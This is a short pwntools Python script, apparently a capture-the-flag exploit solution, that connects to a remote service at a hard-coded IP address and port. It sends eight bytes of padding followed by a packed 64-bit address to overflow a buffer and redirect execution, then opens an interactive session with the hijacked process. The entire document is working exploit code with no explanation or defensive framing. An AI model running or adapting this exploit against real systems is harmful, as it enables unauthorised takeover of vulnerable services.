from pwn import * 

proc = remote("109.233.56.90", 11600)
proc.send(b"a"*8+p64(0x00402058))
proc.interactive()
